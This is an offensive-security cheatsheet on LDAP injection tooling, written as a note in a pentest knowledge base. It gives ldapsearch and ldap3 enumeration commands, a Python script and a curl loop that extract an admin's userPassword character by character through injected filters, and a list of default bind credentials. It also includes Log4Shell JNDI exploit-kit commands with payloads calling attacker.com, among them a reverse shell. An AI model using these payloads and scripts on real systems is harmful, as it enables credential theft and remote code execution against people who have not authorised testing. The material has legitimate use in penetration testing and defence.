---
aliases:
  - ldapsearch
  - ldap3 Python
  - JNDI Exploit Kit
  - LDAP wordlists
tags:
  - type/cheatsheet
  - vuln/ldap-injection
  - technique/discovery
  - asset/web-app
  - asset/directory-service
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[LDAP Injection]]'
  - '[[Burp Suite]]'
---
# LDAP Injection - Tooling

***

## ldapsearch CLI

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Anonymous bind + base info | `ldapsearch -H ldap://target -x -s base -b ""` | RootDSE. |
| Discover naming context | `ldapsearch ... -b "" "(objectClass=*)" namingContexts` | Find base DN. |
| Enumerate todos los users | `ldapsearch -H ldap://target -x -b "dc=target,dc=com" "(objectClass=user)"` | If anon allowed. |
| AD users | `ldapsearch ... -b "DC=target,DC=com" "(&(objectClass=user)(objectCategory=person))"` | AD-specific. |
| Authenticated bind | `ldapsearch -H ldap://target -D "cn=admin,dc=target" -w password ...` | Simple bind con creds. |
| AD authenticated | `ldapsearch -H ldap://dc.target.com -D "user@target.com" -w pass -b "DC=target,DC=com" ...` | AD bind format. |
| Specific attribute | `ldapsearch ... "(uid=*)" mail memberOf` | Solo specific attrs. |
| Filter with wildcard | `"(uid=*)"` | All. |
| Filter compound | `"(&(objectClass=user)(memberOf=cn=admins,...))"` | AND. |
| Filter substring | `"(cn=admin*)"` | Prefix match. |
| Schema enumeration | `ldapsearch ... -b "cn=schema" "(objectClass=*)"` | Schema dump. |
| Subschema | `ldapsearch ... -b "" -s base subschemaSubentry` | Pointer to schema. |
| Read passwords (if exposed) | `ldapsearch ... "(uid=admin)" userPassword` | OpenLDAP — usually hashed. |
| Output LDIF format | Default `ldapsearch` outputs LDIF | Standard format. |
| Single-line output | `-LLL -o ldif-wrap=no` | Easy parsing. |
| StartTLS | `-Z` flag | Upgrade plain to TLS. |
| LDAPS | `-H ldaps://target:636` | TLS direct. |
| SASL bind | `-Y SCRAM-SHA-1` etc | Modern SASL mechanisms. |
^ldap-tool-ldapsearch

___

## ldap3 (Python lib)

| **Función** | **Code** | **Notas** |
|:---:|:---:|:---:|
| Install | `pip install ldap3` | Pure Python, no dependencies. |
| Connect anonymous | `from ldap3 import Server, Connection; conn = Connection(Server('ldap://target')); conn.bind()` | Standard. |
| Authenticated | `Connection(server, user='cn=admin,...', password='...').bind()` | Simple bind. |
| Search | `conn.search('dc=target,dc=com', '(uid=*)')` | Standard search. |
| All attributes | `conn.search('...', '(objectClass=*)', attributes=['*'])` | All attrs. |
| Specific attrs | `attributes=['uid', 'mail', 'memberOf']` | Filtered. |
| Iterate results | `for entry in conn.entries: print(entry)` | Python objects. |
| Add entry | `conn.add('cn=newuser,...', 'inetOrgPerson', {...})` | Modify operation. |
| Modify entry | `conn.modify('cn=user,...', {'userPassword': [(MODIFY_REPLACE, ['newpass'])]})` | Update. |
| Delete entry | `conn.delete('cn=user,...')` | Remove. |
| Custom blind extraction | Loop over chars + check response | Programmable. |
| Connection pooling | Use `Connection(server, auto_bind=True)` | Performance. |
| Async support | `ldap3.async_strategy` | Modern. |
| TLS support | `Server(host, use_ssl=True)` | LDAPS. |
| StartTLS | `conn.start_tls()` | Upgrade. |
^ldap-tool-ldap3

### Script Python blind extraction completo

```python
from ldap3 import Server, Connection
import string

URL = "https://target/login"  # ejemplo HTTP-based

# Si LDAP directo:
server = Server('ldap://target.com')
conn = Connection(server, auto_bind=True)

# Blind char-by-char on userPassword
chars = string.ascii_lowercase + string.digits
result = ""

while True:
    found = False
    for c in chars:
        # Filter inject
        f = f"(&(uid=admin)(userPassword={result}{c}*))"
        conn.search('dc=target,dc=com', f)
        if conn.entries:
            result += c
            print(f"[+] {result}")
            found = True
            break
    if not found:
        break

print(f"Final: {result}")
```

___

## JNDI Exploit Kits (Log4Shell)

| **Tool** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| JNDI-Injection-Exploit (welk1n) | `git clone https://github.com/welk1n/JNDI-Injection-Exploit` | Java-based. |
| JNDIExploit setup | `java -jar JNDIExploit-1.4-SNAPSHOT.jar -i attacker.com -p 1389` | Listen 1389 LDAP. |
| Payload generation | `${jndi:ldap://attacker.com:1389/Basic/Command/Base64/<b64-cmd>}` | Standard format. |
| Reverse shell | `${jndi:ldap://attacker.com:1389/Basic/ReverseShell/IP/PORT}` | Direct. |
| TomcatBypass / TomcatEcho | Variantes para Tomcat-specific runtimes | Stack-aware. |
| Spring bypass | Spring memory shell injection | Persistencia. |
| Marshalsec | `java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker:8888/#Exploit"` | Old school. |
| Log4j-scan (Fullhunt) | Scanner para detection | https://github.com/fullhunt/log4j-scan |
| nuclei templates | `nuclei -t cves/CVE-2021-44228.yaml` | Bulk scanning. |
| Burp Collaborator | Use built-in DNS canary | Detection oracle. |
| `ysoserial` LDAP | `java -jar ysoserial.jar JRMPClient` | Combine con LDAP referral. |
| h2csmuggler + JNDI | Bypass WAF + inject | Combo. |
^ldap-tool-jndi

___

## Wordlists y Resources

| **Wordlist** | **Path / Repo** | **Uso** |
|:---:|:---:|:---:|
| PayloadsAllTheThings - LDAP | `PayloadsAllTheThings/LDAP Injection/` | Standard payloads. |
| HackTricks - LDAP | https://book.hacktricks.xyz/pentesting-web/ldap-injection | Comprehensive. |
| SecLists - LDAP | `SecLists/Fuzzing/LDAP/` | Fuzzing payloads. |
| Burp Intruder built-in | "LDAP Injection" payload set | Pro feature. |
| LDAP injection cheatsheet | OWASP guide | Defenses. |
| AD attribute list | `samAccountName`, `userAccountControl`, etc | AD-specific. |
| Common groups DN | `CN=Domain Admins,...`, `CN=Enterprise Admins,...` | Privesc enum. |
| Bind credentials wordlist | `cn=admin/admin`, `cn=Manager/secret` | Default creds. |
| JNDI bypass payloads | Log4Shell evasions wordlist | WAF bypass. |
| AD attack tools | `BloodHound`, `Impacket`, `CrackMapExec` | Post-LDAP enum. |
^ldap-tool-wordlists

### Manual one-liner blind extraction

```bash
# Iterate chars en HTTP form con LDAP backend
TARGET="https://target/login"
for c in {a..z}; do
  # Try if password starts with $c
  R=$(curl -s -X POST "$TARGET" -d "username=admin)(userPassword=${c}*&password=x")
  if echo "$R" | grep -q "Welcome"; then
    echo "First char: $c"
    break
  fi
done
```

***
